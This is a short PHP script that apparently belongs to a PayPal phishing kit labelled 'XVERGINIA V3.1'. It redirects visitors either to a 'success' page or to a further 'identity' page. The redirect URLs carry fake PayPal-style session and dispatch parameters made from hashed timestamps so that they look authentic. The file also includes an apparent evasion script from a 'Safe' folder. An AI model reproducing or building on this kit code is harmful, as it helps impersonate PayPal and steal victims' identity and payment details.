<?php
 
 error_reporting(E_ERROR | E_PARSE);

// PAYPAL XVERGINIA V3.1

	include('../../functions/Config.php');
	include('../Safe/xanbbx.php');
	
if($Red_identity == "x1")
{
	 HEADER("Location: ../success/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
}
	else
{
	HEADER("Location: ../identity2/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
}
?>